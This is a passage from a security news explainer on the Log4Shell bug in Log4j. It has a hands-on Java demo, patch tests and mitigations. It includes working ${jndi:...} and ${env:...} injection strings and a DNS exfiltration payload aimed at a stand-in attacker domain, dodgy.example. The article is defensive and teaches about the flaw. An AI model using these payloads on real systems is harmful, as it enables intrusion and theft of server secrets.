<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck\&gt; printfhack.exe &quot;%X %X %X %X %X&quot;

   155FA30 1565940 B4E090 B4FCB0 4D110A
</pre>
<p>As it happens, the fifth and last value in the output above, sneakily sucked in from from the program stack, is the return address to which the program jumps after doing the <code>printf()</code>&#8230;</p>
<p>&#8230;so the value <code>0x00000000004D110A</code> gives away where the program code is loaded into memory, and thus breaks the security provided by ASLR (<em>address space layout randomisation</em>). </p>
<p>Software should never permit untrusted users to use untrusted data to manipulate how that very data gets handled.</p>
<p>Otherwise, data misuse of this sort could result.</p>
<aside id="sophos_ad-3" class="widget sophos-inline-ad sophos_widget_ad">				<style></style>
				<div class="sophos_widget_ad"><a href="https://www.sophos.com/en-us/products/managed-threat-response.aspx" class="s-ad-threat-hunter__link-wrapper">
  <div class="s-ad-threat-hunter">
    <div class="s-ad-threat-hunter__title">
      OTHERS STOP AT NOTIFICATION. WE TAKE ACTION
    </div>
    <div class="s-ad-threat-hunter__text">
      Get 24/7 managed threat hunting, detection, and response delivered by
      Sophos experts
    </div>
    <div class="s-ad-threat-hunter__action">
      <span class="s-button s-button--bright-green"> Learn&nbsp;more </span>
    </div>
  </div>
</a></div>
			</aside>
<h2>2. Log4j considered harmful</h2>
<p>There&#8217;s a similar sort of problem in Log4j, but it&#8217;s much, much worse.</p>
<p>Data supplied by an untrusted outsider &#8211; data that you are merely printing out for later reference, or logging into a file &#8211; can take over the server on which you are doing the logging.</p>
<p>This could turn what should be a basic &#8220;print&#8221; instruction into a <em>leak-some-secret-data-out-onto-the-internet</em> situation, or even into a <em>download-and-run-my-malware-at-once</em> command.</p>
<p>Simply put, a log entry that you intended to make for completeness, perhaps even for legal or security reasons, could turn into a malware implantation event.</p>
<p>To understand why, let&#8217;s start with a really simple Java program.</p>
<p>You can follow along if you like by installing the current <a href="https://www.oracle.com/java/technologies/downloads/#jdk17-windows" rel="nofollow">Java SE Development Kit</a>, which was 17.0.1 at the time of writing.</p>
<p>We used Windows, because most of our readers have it, but this code will work fine on Linux or a Mac as well.</p>
<p>Save this as <code>Gday.java</code>:</p>
<pre class="brush: java; title: ; notranslate" title="">
   public class Gday {

      public static void main(String... args) {
         System.out.println(&quot;Main says, 'Hello, world.'&quot;);
         System.out.println(&quot;Main is exiting.&quot;);
      }
   }
</pre>
<p>Open a command prompt (use <code>CMD.EXE</code> on Windows to match our commands, not PowerShell; use your favourite shell on Linux or Mac) and make sure you can compile and run this file.</p>
<p>Because it contains a <code>main()</code> function, this file is designed to execute as a program, so you should see this when you run it with the <code>java</code> command:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck&gt; java Gday.java

   Main says, 'Hello, world.'
   Main is exiting.

</pre>
<p>If you&#8217;ve got this far, your Java Development Kit is installed correctly for what comes next.</p>
<p>Now let&#8217;s add Log4j into the mix.</p>
<p>You can download the previous (unpatched) and current (patched) versions from the <a href="https://archive.apache.org/dist/logging/log4j/" rel="nofollow">Apache Log4j</a> site.</p>
<p>You will need: <a href="https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-bin.zip" rel="nofollow"><code>apache-log4j-2.14.1-bin.zip</code></a> and <a href="https://archive.apache.org/dist/logging/log4j/2.15.0/apache-log4j-2.15.0-bin.zip" rel="nofollow"><code>apache-log4j-2.15.0-bin.zip</code></a></p>
<p>We&#8217;ll start with the vulnerable version, 2.14.1, so extract the following two files from the relevant zipfile, and place them in the directory where you put your <code>Gday.java</code> file: </p>
<pre class="brush: plain; title: ; notranslate" title="">
   ---Timestamp----  --Size---  --------File---------
   06/03/2021 22:07    300,364  log4j-api-2.14.1.jar
   06/03/2021 22:07  1,745,701  log4j-core-2.14.1.jar

</pre>
<p>Now tell Java that you want to bring these two extra modules into play by adding them to your <code>CLASSPATH</code>, which is the list of extra Java modules where Java looks for add-on code libraries (put a colon between the filenames on Linux or Mac, and change <code>set</code> to <code>export</code>):</p>
<pre class="brush: plain; title: ; notranslate" title="">
   set CLASSPATH=log4j-core-2.14.1.jar;log4j-api-2.14.1.jar

</pre>
<p>(If you don&#8217;t add the Log4j JAR files to the list of known modules correctly, you will get &#8220;unknown symbol&#8221; errors when you run the code below.)</p>
<p>Copy your minimlist <code>Gday.java</code> file to <code>TryLogger.java</code> and modify it like this:</p>
<pre class="brush: java; title: ; notranslate" title="">
   import org.apache.logging.log4j.Logger;
   import org.apache.logging.log4j.LogManager;
   
   public class Gday {
      static Logger logger = LogManager.getLogger(Gday.class);
   
      public static void main(String... args) {
         System.out.println(&quot;Main says, 'Hello, world.'&quot;);
         logger.error(args[0]);
         System.out.println(&quot;Main is exiting.&quot;);
      }
   }
</pre>
<p>Now we can compile, run and pass this program a command line argument, all in one go.</p>
<p>We&#8217;re logging with the <code>error()</code> function, even though we are not really dealing with an error, because that logging level is enabled by default, so  we don&#8217;t need to create a Log4j configuration file.</p>
<p>We&#8217;re using the first command-line argument (<code>args[0]</code> in Java, corresponding roughly to <code>argv[1]</code> in C above) as the text to log, so we can inject the logging text externally, as we did above.</p>
<p>If there are spaces in the text string you want to log, put it in double quotes pn Windows, or single-quotes on Linux and Mac:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck&gt; java TryLogger.java &quot;Hello there&quot;

   Main says, 'Hello, world.'
   18:40:46.385 [main] ERROR Gday - Hello there
   Main is exiting.

</pre>
<p>(If you don&#8217;t put an argument on the command line after the filename <code>TryLogger.java</code>, you will get a <code>java.lang.Array&shy;IndexOutOf&shy;BoundsException</code>, because there won&#8217;t be an <code>args[0]</code> string to print out.)</p>
<p>If you&#8217;re seeing the middle output line above, starting with a timestamp and a function name, then the Log4j Logger object you created in the program is working correctly.</p>
<h2>3. Log4j &#8220;lookup&#8221; features</h2>
<p>Get ready for the scary part, which is documented <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">in some detail</a> on the Apache Log4j site:</p>
<blockquote><p>&#8220;Lookups&#8221; provide a way to add values to the Log4j configuration at arbitrary places.</p></blockquote>
<p>Simply put, the user who&#8217;s supplying the data you&#8217;re planning to log gets to choose not only how it&#8217;s formatted, but even what it contains, and how that content is acquired.</p>
<p>If you&#8217;re logging for legal or security purposes, or even simply for completeness, you&#8217;re probably surprised to hear this.</p>
<p>Giving the person at the other end a say into how to log the data they submit means not only that your logs don&#8217;t always contains a faithful record of the actual data that you received, but also that they might end up containing data from elsewhere on your server that you wouldn&#8217;t normally choose to save to a logfile at all.</p>
<p>Lookups in Log4j are triggered not by <code>%</code> characters, as they were in <code>printf()</code> above, but by special <code>${....} </code>sequences, like this:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck&gt; java TryLogger.java &quot;${java:version}/${java:os}&quot;

   Main says, 'Hello, world.'
   18:51:52.959 [main] ERROR Gday - Java version 17.0.1/Windows 10 10.0, architecture: amd64-64
   Main is exiting.

</pre>
<p>See what happened there?</p>
<p>The only character in the data you supplied that made it into the actual log output was the <code>/</code> (slash) in the middle; the other parts were rewritten with the details of the Java runtime that you&#8217;re using.</p>
<p>Even more worryingly, the person who gets to choose the text that&#8217;s logged can leak run-time process environment variables into your logfile, like this (put <code>USER</code> instead of <code>USERNAME</code> on Linux or Mac):</p>
<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck\LOG4J&gt; java TryLogger.java &quot;Username is ${env:USERNAME}&quot;

   Main says, 'Hello, world.'
   18:55:47.744 [main] ERROR Gday - Username is duck
   Main is exiting.

</pre>
<p>Given that environment variables sometimes contain temporary private data such as access tokens or session keys, and given that you would usually take care not to keep permanent records of that sort of data, there&#8217;s already a significant data leakage risk here.</p>
<p>For example, most web clients include an HTTP header called <code>User-Agent</code>, and most HTTP servers like to keep a record of which browsers came calling, to help them decide which ones to support in future.</p>
<p>An attacker who deliberately sent over a <code>User-Agent</code> string such as <code>${env:TEMPORARY_SESSION_TOKEN}</code> instead of, say, <code>Microsoft Edge</code>, could cause compliance headaches by tricking your server into saving to disk a data string that was only ever supposed to be stored in memory.</p>
<h2>4. Remote lookups possible</h2>
<p>There&#8217;s more.</p>
<p>Thanks to a feature of the Java runtime called JNDI, short for <em>Java Naming and Directory Interface</em>, Log4j &#8220;lookup&#8221; commands wrapped in <code>${...}</code> sequences can not only do simple string replacements, but also do live runtime lookups to arbitary servers, both inside and outside your network.</p>
<p>To see this in action, we need a program that will listen out for TCP connections and report when it gets one, so we can see whether Log4j really is making network connections.</p>
<p>We will use <code>ncat</code> from the free and popular <a href="https://nmap.org/" rel="nofollow">Nmap toolkit</a>; your Linux your distro may already have <code>ncat</code> installed (try it and see), but for Windows you will need to install it from the <a href="https://nmap.org/" rel="nofollow">official Nmap site</a>.</p>
<p>We used <a href="https://nmap.org/dist/nmap-7.92-setup.exe" rel="nofollow">version 7.92</a>, which was current at the time of writing.</p>
<p>We&#8217;ll keep everything local, referring to the server <code>127.0.0.1</code> (or you can use the name <code>localhost</code>, which refers to the same thing),  the very computer you are on at the moment:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck\LOG4J&gt; ncat -k -vv -c &quot;echo ---CONNECTION [%NCAT_REMOTE_PORT%]--- 1&gt;&amp;2&quot; -l 8888

   Ncat: Version 7.92 ( https://nmap.org/ncat )
   Ncat: Listening on :::8888
   Ncat: Listening on 0.0.0.0:8888
   [. . .program waits here. . .]
</pre>
<p>To explain the <code>ncat</code> command-line options:</p>
<ul>
<li><code>-k</code> means to keep listening out for connections, not to exit after the first one.
<li><code>-vv</code> means to be somewhat verbose, so we can verify that it&#8217;s listening OK.
<li><code>-c</code> specifies a command that sends a reply to the other end, which is the minimum action we need to trick Log4j so it doesn&#8217;t hang up and wait forever. The special variable <code>%NCAT_REMOTE_PORT%</code> (use <code>$NCAT_REMOTE_PORT</code> on Linux and Mac) will be different each time so that we can easily see when new requests come in.
<li><code>-l</code> means to act as a TCP server, by listening on port 8888.
</ul>
<p>Now try this in your other command window:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck&gt; java TryLogger.java ${jndi:ldap://127.0.0.1:8888/blah}

   Main says, 'Hello, world.'
   19:17:21.876 [main] ERROR Gday - ${jndi:ldap://127.0.0.1:8888/blah}
   Main is exiting.
</pre>
<p>Even though your command-line argument was echoed precisely in the output, as though no lookup or substitution took place, and as if there were no shenanigans afoot, you should see something curious like this in the <code>ncat</code> window:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   Ncat: Connection from 127.0.0.1.
   Ncat: Connection from 127.0.0.1:50326.
   NCAT DEBUG: Executing: C:\Windows\system32\cmd.exe /C echo ---CONNECTION [%NCAT_REMOTE_PORT%]--- 1&gt;&amp;2
   ---CONNECTION [50326]---

</pre>
<p>This means we&#8217;ve tricked our innocent Java progam into making a network connection (we could have used an external servername, thus heading out anywhere on the internet), and reading in yet more arbitary, untrusted data to use in the logging code.</p>
<p>In this case, we deliberately sent back the text string <code>---CONNECTION [50326]---</code>, which is enough to complete the JNDI lookup, but isn&#8217;t legal JNDI data, so our Java program thankfully ignores it and logs the original, unsubtituted data instead. (This makes the test safe to do at home, because there isn&#8217;t any remote code execution.)</p>
<p>But in a real-world attack, cybercriminals who know the right data format to use (we will not show it here, but JNDI is officially documented) could not only send back data for you to use, but even hand you a Java program that your server will then execute to generate the needed data.</p>
<p>You read that correctly!</p>
<p>An attacker who knows the right format, or who knows how to download an attack tool that can supply malicious Java code in the right format, <strong>may be able to use the Log4j Logger object as a tool to implant malware on your server</strong>, running that malicious code right inside the Java process that called the Logger function.</p>
<p>And there you have it: uncomplicated, reliable, by-design <em>remote code execution</em> (RCE), triggered by user-supplied data that may ironically be getting logged for auditing or security purposes.</p>
<h2>5. Is your server affected?</h2>
<p>One challenge posed by this vulnerability is to figure out which servers or servers on your network are affected.</p>
<p>At first glance, you might assume that you only need to consider servers with network-facing code that&#8217;s written in Java, where the incoming TCP connections that service requests are handled directly by Java software and the Java runtime libraries.</p>
<p>If that were so, then any services fronted by products such as Apache&#8217;s own <code>httpd</code> web server, Microsoft IIS, or <code>nginx</code> would implicitly be safe. (All those servers are primarily coded in C or C++.)</p>
<p>But determining both the breadth and depth of this vulnerability in all but the smallest network can be quite tricky, <strong>and Log4Shell is not restricted to servers written in 100% pure Java</strong>.</p>
<p>After all, it&#8217;s not the TCP-based socket handling code that is afflicted by this bug: the vulnerability could lurk anywhere in your back-end network where user-supplied data is processed and logs are kept.</p>
<p>A web server that logs your <code>User-Agent</code> string probably does so directly, so a C-based web server with a C-based logging engine is probably not at risk from booby-trapped <code>User-Agent</code> strings.</p>
<p>But many web servers take data entered into online forms, for example, and pass it on to &#8220;business logic&#8221; servers in the background that dissect it, parse it, validate it, log it, and reply to it.</p>
<p>If one of those business logic servers is written in Java, it could be the rotten coding apple that spoils the application barrel.</p>
<p>Ideally, then, <strong>you need to find any and all code in your network that is written in Java and check whether it uses the Log4j library</strong>.</p>
<p style="background-color:#e8e8e8;font-size:80%;padding:1em 2em;margin:2em 0">Sophos has published an XDR (extended detection and response) query that will <a href="https://www.sophos.com/en-us/security-advisories/sophos-sa-20211210-log4j-rce">quickly identify</a> Linux servers that have Debian-style or Red Hat-style Log4j packages installed as part of your distro, and report the version in use. This makes it easy to find servers where Log4j is available to any Java programs that want to use it, even if you didn&#8217;t knowingly install the library yourself.</p>
<p><strong>Out-of-date Log4j versions need to be updated at soon as possible</strong>, even if you don&#8217;t think anyone is currently using them.</p>
<p>Note that <strong>Log4j 1.x is no longer supported at all</strong>, and a bug related to Log4Shell, dubbed <a href="https://access.redhat.com/security/cve/CVE-2021-4104" rel="nofollow">CVE-2021-4104</a>, exists in this version.</p>
<p>So, the update path for Log4j 1.x means switching to Log4j 2.</p>
<p>Remember, of course, that Java programs can be configured to use their own copies of any Java library, or even of Java itself, as we did when we set the <code>CLASSPATH</code> environment variable above.</p>
<p><strong>Search right across your estate</strong>, taking in clients and servers running Linux, Mac and Windows, looking for files named <code>log4j*.jar</code>.</p>
<p>Unlike executable shared libraries (such as NSS, which we <a href="https://nakedsecurity.sophos.com/2021/12/03/mozilla-patches-exploitable-bigsig-cryptographic-bug/">wrote about recently</a>), you don&#8217;t need to remember to search for different extensions on each platform because the JAR files we showed above are named identically on all operating systems.</p>
<p>Wherever possible, <strong>update any and all copies of Log4j, wherever they are found, as soon as you can</strong>.</p>
<h2>6. Does the patch work?</h2>
<p>You can prove to yourself that the 2.15.0 version suppresses this hole on your systems, at least in the simple test code we sused above, by extracting the new JAR files from the updated <code>apache-log4j-2.15.0-bin.zip</code> file you downloaded earlier:</p>
<p>Extract the following two files from the updated zipfile, and place them in the directory where you put your <code>.java</code> files, alongside the previous JAR versions: </p>
<pre class="brush: plain; title: ; notranslate" title="">
   ---Timestamp----  --Size---  --------File---------
   09/12/2021 11:20    301,805  log4j-api-2.15.0.jar
   09/12/2021 11:20  1,789,769  log4j-core-2.15.0.jar
</pre>
<p>Change your <code>CLASSPATH</code> variable with:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   set CLASSPATH=log4j-core-2.15.0.jar;log4j-api-2.15.0.jar 
</pre>
<p>Repeat the <code>${jndi:ldap://127.0.0.1:8888/blah}</code> test shown above, and verify that the <code>ncat</code> connection log no longer shows any network traffic.</p>
<p>The updated version of Log4j still supports the potentially dangerous <em>what-you-see-is-not-what-you-get</em> system of string &#8220;lookups&#8221;, but network-based JNDI connections, whether on the same machine or reaching out to somewhere else, are no longer enabled by default.</p>
<p>This greatly reduces your risk, both of data exfiltration, for example by means of the <code>${env:SECRET_VARIABLE}</code> trick mentioned above, and of malware infection via implanted Java code.</p>
<h2>7. What if you can&#8217;t update?</h2>
<p>Apache has proposed three different workarounds in case you can&#8217;t update yet; we tried them all and found them to work.</p>
<ul>
<li><strong>A. Run your vulnerable program under Java with an added command line option to suppress JNDI lookups</strong>, like this:
</ul>
<pre class="brush: plain; title: ; notranslate" title="">
   java -Dlog4j2.formatMsgNoLookups=true TryLogger.java ${jndi:ldap://127.0.0.1:8888/try}

</pre>
<p>This sets a special system property that prevents any sort of <code>{$jndi:...}</code> activity from triggering a network connection, which prevents both exfiltration and remote code implantation.</p>
<ul style='margin-top:2em'>
<li><strong>B. Set an environment variable</strong> to force the same result:
</ul>
<pre class="brush: plain; title: ; notranslate" title="">
   set LOG4J_FORMAT_MSG_NO_LOOKUPS=true
   java TryLogger.java ${jndi:ldap://127.0.0.1:8888/try}

</pre>
<ul style='margin-top:2em'>
<li><strong>C. Repackage your <code>log4j-core-*.jar</code> file</strong> by unzipping it, deleting the component called <code>org/apache/logging/log4j/core/lookup/JndiLookup.class</code>, and zipping the other files back up again.
</ul>
<p>We used the popular and free <a href="https://www.7-zip.org/" rel="nofollow">7-Zip</a> File Manager to do just that, which neatly automates the unzip-and-rezip process, and the modified JAR file solved the problem.</p>
<p>This technique is needed if you have a Log4j version earlier than 2.10.0, because the command-line and environment variable mitigations only work from version 2.10.0 onwards.</p>
<figure id="attachment_647498" aria-describedby="caption-attachment-647498" style="width: 692px" class="wp-caption aligncenter"><img loading="lazy" src="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/7z-file-692.png" alt="" width="692" height="540" class="size-full wp-image-647498" srcset="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/7z-file-692.png 692w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/7z-file-692.png?resize=300,234 300w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/7z-file-692.png?resize=90,70 90w" sizes="(max-width: 692px) 100vw, 692px" /><figcaption id="caption-attachment-647498" class="wp-caption-text">Open log4j-core*.jar file you want to patch.</figcaption></figure>
<figure id="attachment_647499" aria-describedby="caption-attachment-647499" style="width: 692px" class="wp-caption aligncenter"><img loading="lazy" src="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/7z-remv-692.png" alt="" width="692" height="540" class="size-full wp-image-647499" srcset="https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/7z-remv-692.png 692w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/7z-remv-692.png?resize=300,234 300w, https://nakedsecurity.sophos.com/wp-content/uploads/sites/2/2021/12/7z-remv-692.png?resize=90,70 90w" sizes="(max-width: 692px) 100vw, 692px" /><figcaption id="caption-attachment-647499" class="wp-caption-text">Navigate to lookup directory and right-click to delete JndiLookup.class.</figcaption></figure>
<p>On Linux or Mac you can remove the offending component from the JAR file from the command line like this:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   zip -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

</pre>
<p>This works because Java Archives (<code>.jar</code> files) are actually just ZIP files with a specific internal layout.</p>
<p style="background-color:#e8e8e8;font-size:80%;padding:1em 2em;margin:2em 0"><strong>Update.</strong> Apache has updated Log4j again, from 2.15.0 to <strong>2.16.0</strong>, to prevent a problem that neither the command line option <code>-Dlog4j2.formatMsg&shy;NoLookups=true</code> nor the environment variable setting <code>LOG4J_FORMAT_MSG_&shy;NO_LOOKUPS=true</code> would prevent. Fortunately, this additional bug, dubbed <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046" rel="nofollow">CVE-2021-45046</a>, doesn&#8217;t seem to permit remote code execution or data exfiltration, merely a denial of service attack that could cause the affected process to hang. Patching to 2.16.0 apparently disables JNDI altogether and fixes CVE-2021-44228 and CVE-2021-45046 at the same time. [2021-21-14T21:44:00Z]</p>
<h2>8. What else could go wrong?</h2>
<p>As we mentioned above, the primary risk of this JNDI &#8220;lookup&#8221; problem is that a well-informed criminal can not only trick your server into calling out to an untrusted external site&#8230;</p>
<p>&#8230;but also co-opt it into downloading and blindly executing untrusted code, thus leading to remote code execution (RCE) and malware implantation.</p>
<p>Strict firewall rules that prevent your server from calling out to the internet are an excellent defence-in-depth protection for CVE-2021-44228: if the server can&#8217;t make the TCP connection in the first place, it can&#8217;t download anything either.</p>
<p>But there is a secondary risk that some attackers are already trying, which could leak out data even if you have a restrictive firewall, by using DNS.</p>
<p>This trick involves the <code>${env:SECRET_VALUE}</code> sequence we mentioned earlier for sneakily accessing the value of server environment variables.</p>
<p>Even on a non-corporate Windows desktop computer, the default list of environment variables is impressive, including:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck&gt; set

   ALLUSERSPROFILE=C:\ProgramData
   APPDATA=C:\Users\duck\AppData\Roaming
   [. . .]
   COMPUTERNAME=LIVEDEMO
   [. . .]
   HOMEDRIVE=C:
   HOMEPATH=\Users\duck
   [. . .]
   LOCALAPPDATA=C:\Users\duck\AppData\Local
   [. . .]
   USERDOMAIN=LIVEDEMO
   USERDOMAIN_ROAMINGPROFILE=LIVEDEMO
   USERNAME=duck
   [. . .]
</pre>
<p>An attacker who knows that TCP requests will not get out of your network can nevertheless steal environment values and other Log4j &#8220;lookup&#8221; strings like this:</p>
<pre class="brush: plain; title: ; notranslate" title="">
   C:\Users\duck\LOG4J&gt; java TryLogger.java ${jndi:ldap://useris-${env:USERNAME}.dodgy.example/blah

   Main says, 'Hello, world.'
   21:33:35.003 [main] ERROR Gday - ${jndi:ldap://useris-${env:USERNAME}.dodgy.example/blah
   Main is exiting.

</pre>
<p>This looks innocent enough: clearly, there&#8217;s no way we can have a real server running at the right location to receive the JNDI callout in this example.</p>
<p>We don&#8217;t yet know the value of <code>${env:SECRET_VALUE}</code> because that is, after all, the very data we are after.</p>
<p>But when we did this test, we had control over the DNS server for the domain <code>dodgy.example</code>, so our DNS server captured the Java code&#8217;s attempt to find the relevant servername online, and our DNS records therefore revealed the stolen data.</p>
<p>In the list below, most of the lookups came from elsewhere on our network (browsers looking for ad sites, and a running copy of Teams), but the lookups for <code>useris-duck.dodgy.example</code> were JNDI trying to find the data-leaking servername:</p>
<pre class="brush: plain; title: ; notranslate" title="">
9014--&gt;  AAAA for ads.servenobid.com
9015--&gt;     A for e3.adpushup.com
9016--&gt;  AAAA for e3.adpushup.com
9017--&gt;     A for presence.teams.microsoft.com
9018--&gt;  AAAA for presence.teams.microsoft.com
[. . .]
9104--&gt;     A for useris-duck.dodgy.example   &lt;--- leaked the USERNAME string &quot;duck&quot;
9105--&gt;  AAAA for useris-duck.dodgy.example
9106--&gt;     A for useris-duck.dodgy.example
9107--&gt;  AAAA for useris-duck.dodgy.example
[. . .]
9236--&gt;  AAAA for e.serverbid.com
9237--&gt;     A for e.serverbid.com
9238--&gt;     A for e.serverbid.com
</pre>
<p>In this case, we didn&#8217;t even try to resolve <code>useris-duck.dodgy.example</code> and make the server connection work.</p>
<p>We simply sent back an <code>NXDOMAIN</code> (<em>server does not exist</em>) reply and JNDI went no further &#8211; but the damage was already done, thanks to the &#8220;secret&#8221; text <code>duck</code> embedded in the subdomain name.</p>
<h2>9. What to do?</h2>
<p>IPS rules, WAF rules, firewall rules and web filtering can all help, by blocking malicious CVE-2021-44228 data from outside, and by preventing servers from connecting to unwanted or known-bad sites.</p>
<p>But the staggering number of ways that those dodgy <code>${jndi:...}</code> exploit strings can be encoded, and the huge number of different places within network data streams that they can appear, means that the best way to help yourself, and thereby to help everyone else as well&#8230;</p>
<p>&#8230;is one of these two options:</p>
<ul>
<li><strong>Patch your own systems right now.</strong> Don&#8217;t wait for everyone else to go first.
<li><strong>Use one of the mitigations above</strong> if you can&#8217;t patch yet.
</ul>
<p>Be part of the solution, not part of the problem!</p>
<p>By the way, our personal recommendation, when the dust has settled, is to consider dropping Log4j if you can.</p>
<p>Remember that this bug, if you can call it that, was the result of a feature, and many aspects of that &#8220;feature&#8221; remain, leaving outsiders still in control of some of the content of your internal logs.</p>
<p>To paraphrase the old joke about getting lost in the backroads of the countryside, &#8220;If cybersecurity is where you want to get to, you probably shouldn&#8217;t start from here.&#8221;</p>
<hr style='margin-top:2em'>
<p style='background-color: #0d69ba;padding: 0.5em;text-align: center;color: white;font-size: 90%;margin-top:2em'><strong>LEARN HOW CYBERCRIMINALS ARE USING THIS VULNERABILITY IN THE WILD</strong></p>
<div style='text-align:center'>
<blockquote class="wp-embedded-content" data-secret="NDCMgdBt76"><p><a href="https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/">Log4Shell Hell: anatomy of an exploit outbreak</a></p></blockquote>
<p><iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" title="&#8220;Log4Shell Hell: anatomy of an exploit outbreak&#8221; &#8212; Sophos News" src="https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/embed/#?secret=NDCMgdBt76" data-secret="NDCMgdBt76" width="600" height="338" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>
</div>
<hr style='margin-top:2em'>
			</div> <!-- .entry-content -->
	<ul class="block social follow">
		<li>
			<svg style="height: 24px" viewBox="0 0 24 24" class="icon twitter"><use xlink:href="#twitter"></use></svg>
			<p>Follow <strong><a href="https://twitter.com/nakedsecurity">@NakedSecurity on Twitter</a></strong> for the latest computer security news.</p>
		</li>
		<li>
			<svg style="height: 24px" viewBox="0 0 24 24" class="icon instagram"><use xlink:href="#instagram"></use></svg>
			<p>Follow <strong><a href="https://www.instagram.com/nakedsecurity/">@NakedSecurity on Instagram</a></strong> for exclusive pics, gifs, vids and LOLs!</p>
		</li>
	</ul>
</article><!-- #post-## -->

		<div class="free-tools-block">
			<h2 class="block-title">Free tools</h2>

<div class="ns-free-tools">
	<div class="ns-free-tools__item ns-free-tools__item--sophos-home">
		<a class="ns-free-tools__link" href="https://www.sophos.com/en-us/products/free-tools/sophos-xg-firewall-home-edition.aspx">
			<figure class="ns-free-tools__image">
				<svg width="40" height="40" fill="none" xmlns="http://www.w3.org/2000/svg">
					<path d="M25.833 32.023H9.167a.417.417 0 0 0-.417.417v6.25c0 .23.187.417.417.417h16.666c.23 0 .417-.187.417-.417v-6.25a.417.417 0 0 0-.417-.417ZM1.25 32.023a.416.416 0 0 0-.417.417v5A1.667 1.667 0 0 0 2.5 39.107h3.333a.416.416 0 0 0 .417-.417v-6.25a.417.417 0 0 0-.417-.417H1.25ZM38.75 29.523a.416.416 0 0 0 .417-.416v-5A1.667 1.667 0 0 0 37.5 22.44H20a.416.416 0 0 0-.417.417v6.25a.416.416 0 0 0 .417.416h18.75ZM28.75 38.69a.417.417 0 0 0 .417.417H37.5a1.666 1.666 0 0 0 1.667-1.667v-5a.416.416 0 0 0-.417-.417h-9.583a.417.417 0 0 0-.417.417v6.25ZM16.667 29.523a.417.417 0 0 0 .416-.416v-6.25a.417.417 0 0 0-.416-.417H2.5a1.667 1.667 0 0 0-1.667 1.667v5a.417.417 0 0 0 .417.416h15.417ZM29.38 7.883h-.435l-2.622 3.284a.417.417 0 0 1-.728-.152c-.809-2.964-.737-6.1.207-9.023a.832.832 0 0 0-.909-1.084 15.864 15.864 0 0 0-11.525 7.667.417.417 0 0 1-.489.186.421.421 0 0 1-.16-.094l-1.834-1.779a.832.832 0 0 0-1.217.059 12.458 12.458 0 0 0-2.356 11.87.415.415 0 0 0 .396.288h5.549a.416.416 0 0 0 .41-.342 8.858 8.858 0 0 1 4.428-6.22.833.833 0 0 1 1.215.97 6.572 6.572 0 0 0 .43 4.834.42.42 0 0 0 .353.226 2.149 2.149 0 0 0 1.805-1.105.832.832 0 0 1 1.272-.181c.47.44.845.972 1.1 1.563a.419.419 0 0 0 .382.248h5.965a.418.418 0 0 0 .396-.288A12.47 12.47 0 0 0 29.38 7.875v.008Z" fill="#000"/>
				</svg>
			</figure>
			<h4 class="ns-free-tools__title">
				Sophos Firewall Home Edition			</h4>
			<div class="ns-free-tools__sub-title">
				Boost your home network security.			</div>
		</a>
	</div>
	<div class="ns-free-tools__item ns-free-tools__item--hitman-pro">
		<a class="ns-free-tools__link" href="https://www.sophos.com/en-us/products/free-tools/virus-removal-tool.aspx">
			<figure class="ns-free-tools__image">
				<svg width="40" height="40" fill="none" xmlns="http://www.w3.org/2000/svg">
					<path d="M10.833 36.667H3.75a.416.416 0 0 1-.417-.417v-7.083a1.666 1.666 0 1 0-3.333 0v7.5A3.333 3.333 0 0 0 3.333 40h7.5a1.666 1.666 0 1 0 0-3.333ZM1.667 12.5a1.667 1.667 0 0 0 1.666-1.667V3.75a.417.417 0 0 1 .417-.417h7.083a1.666 1.666 0 1 0 0-3.333h-7.5A3.333 3.333 0 0 0 0 3.333v7.5A1.666 1.666 0 0 0 1.667 12.5ZM38.333 27.5a1.667 1.667 0 0 0-1.666 1.667v7.083a.416.416 0 0 1-.417.417h-7.083a1.667 1.667 0 1 0 0 3.333h7.5A3.333 3.333 0 0 0 40 36.667v-7.5a1.666 1.666 0 0 0-1.667-1.667ZM36.667 0h-7.5a1.666 1.666 0 1 0 0 3.333h7.083a.417.417 0 0 1 .417.417v7.083a1.667 1.667 0 1 0 3.333 0v-7.5A3.333 3.333 0 0 0 36.667 0ZM20 22.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z" fill="#000"/>
